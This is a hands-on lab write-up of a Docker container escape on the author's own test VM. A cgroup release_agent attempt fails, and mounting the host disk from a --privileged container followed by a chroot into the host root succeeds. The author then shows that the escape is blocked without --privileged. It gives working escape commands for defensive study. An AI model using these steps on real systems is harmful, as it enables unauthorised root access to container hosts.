## Objective

Deliberately break a container. Run a `--privileged` Docker container and walk through a host-escape technique myself, confirm the host is reachable, then repeat with `--privileged` removed and capabilities dropped to confirm the escape fails.

Environment: `testbox3`, an Ubuntu 26.04.1 LTS VM on a NAT connection, Docker already set up from Lab 1.

## Attempt 1: cgroup v1 `release_agent` technique (failed — informative)

The classic HackTricks / Trail of Bits privileged-container escape abuses the cgroup v1 `release_agent` file: you create a cgroup, set `notify_on_release=1`, point `release_agent` at a script, then trigger it by emptying the cgroup's process list. The script runs on the host.

```bash
docker run -it --privileged --name escape-test ubuntu:latest bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
```

This failed with `permission denied` on the mount. Checking the host confirmed why:

```bash
sudo mount | grep cgroup
# cgroup2 on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate,...)
```

testbox3 (Ubuntu 26.04) runs **cgroup v2 only** — there's no legacy v1 hierarchy to mount at all. The technique as documented on HackTricks predates the cgroup v2-only default and doesn't apply here without modification.

Second blocker, discovered after fixing the mount: Docker has defaulted to `--cgroupns=private` since 20.10, meaning even `--privileged` containers get their own cgroup namespace rather than the host's by default. This alone would have blocked the technique even on a v1 host. Fix: add `--cgroupns=host` explicitly.

```bash
docker run -it --privileged --cgroupns=host --name escape-test ubuntu:latest bash
mkdir /tmp/cgrp
mount -t cgroup2 -o nsdelegate cgroup2 /tmp/cgrp
mkdir /tmp/cgrp/x
ls /tmp/cgrp
```

The mount succeeded this time, but `ls /tmp/cgrp` showed no `release_agent` file anywhere in the hierarchy. Cgroup v2 removed `release_agent` in favor of a different mechanism entirely — the technique's core primitive simply doesn't exist on this system. Rather than chase a v2-native equivalent of the same trick, I pivoted to a more directly applicable modern escape: raw host device access.

## Attempt 2: host device access via `--privileged` (successful)

`--privileged` exposes all host device nodes inside the container. The host's disk shows up as `/dev/sda` with its partition table intact.

```bash
ls /dev            # sda, sda1, sda2, sda3, etc. all visible
blkid
```

`blkid` output:

| Device | Type | Notes |
|---|---|---|
| `/dev/sda1` | (unrecognized) | 1M — BIOS boot partition |
| `/dev/sda2` | ext4 | 2G — `/boot` |
| `/dev/sda3` | LVM2_member | 23G — LVM physical volume |
| `/dev/dm-0` | ext4 | LVM logical volume — actual host root |

Confirming the LVM/root layout: `lsblk` doesn't show `dm-0` nested under `sda3` unless the volume group is active — but since testbox3's LVM was already active on the host before the container started, the device node was present and mountable directly without needing `vgscan`/`vgchange -ay` inside the container.

First mounted `/boot` (`sda2`) to validate the approach without touching LVM:

```bash
mount /dev/sda2 /mnt/hostfs
ls /mnt/hostfs        # vmlinuz, grub, initrd.img — real host boot files
echo "escaped from container $(hostname)" > /mnt/hostfs/proof.txt
```

Verified independently from the host itself (outside Docker):

```bash
sudo mount /dev/sda2 /mnt/verify
cat /mnt/verify/proof.txt
# escaped from container 82615aae9cca
```

Confirmed — the container's write landed on the real host disk, verified from outside the container entirely.

Then went further and mounted the actual root LV for a full chroot:

```bash
mount /dev/dm-0 /mnt/hostfs
chroot /mnt/hostfs /bin/bash
ls /                # full host filesystem: etc, home, var, root, usr...
cat /etc/hostname    # testbox3
whoami; id           # root, uid=0
```

`/etc/hostname` returning `testbox3` is the clearest proof: this is a live shell running against the real host's root filesystem, not the container's. Note the shell prompt still shows the container's hex hostname — that's cosmetic, baked into `PS1` at shell startup before the chroot; it doesn't reflect the actual filesystem root the shell is now operating against.

## Attempt 3: same technique, no `--privileged` (blocked — as expected)

```bash
docker run -it --rm --name escape-test-safe ubuntu:latest bash
ls /dev
```

Device list without `--privileged`: `console, core, fd, full, mqueue, null, ptmx, pts, random, shm, stderr, stdin, stdout, tty, urandom, zero` — no `sda*`, no `dm-0`. The host's disks aren't exposed to the container at all.

```bash
mkdir /mnt/hostfs
mount /dev/sda2 /mnt/hostfs
# mount: /mnt/hostfs: permission denied.

mkdir /tmp/cgrp
mount -t cgroup2 -o nsdelegate cgroup2 /tmp/cgrp
# mount: /tmp/cgrp: permission denied.
```

Both blocked outright.

## Before / after

| | `--privileged` | default |
|---|---|---|
| Host disk devices in `/dev` | Yes (`sda1/2/3`, `dm-0`) | No |
| Mount host partition | Succeeds | `permission denied` |
| Mount cgroup2 with `nsdelegate` | Succeeds | `permission denied` |
| Result | Full chroot into host root (`/etc/hostname` = `testbox3`) | Escape blocked at every step |

## Takeaways

- The cgroup `release_agent` escape widely documented online assumes a cgroup v1 host and Docker's pre-20.10 default cgroup namespace behavior. Neither held true here — worth verifying `mount | grep cgroup` and Docker version before assuming a documented PoC applies as-is.
- `--privileged` is broad enough that a device-based escape (raw disk access → mount → chroot) works even when a specific documented technique (cgroup `release_agent`) doesn't apply to the host's kernel version.
- Device node exposure doesn't depend on the container activating LVM itself — if the host's volume group is already active, the resulting `/dev/dm-*` node is exposed to a privileged container as-is.
- The clean negative test (`--rm`, no `--privileged`) is worth running even when the positive test succeeds — it's the side-by-side contrast that actually demonstrates *why* `--privileged` is dangerous, not just that it can be abused.
